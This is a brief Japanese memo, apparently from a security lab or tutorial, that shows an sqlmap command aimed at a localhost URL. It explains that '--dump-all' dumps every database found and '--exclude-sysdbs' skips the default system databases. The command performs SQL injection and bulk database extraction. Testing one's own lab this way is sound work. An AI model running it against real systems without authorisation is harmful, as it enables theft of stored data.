```
sqlmap -u http://localhost:8081/?id=1 --dump-all --exclude-sysdbs
```
「--dump-all」は見つかった全てのDBを検索してダンプする   
「--exclude-sysdbs」はデフォルトのDBで時間を浪費しない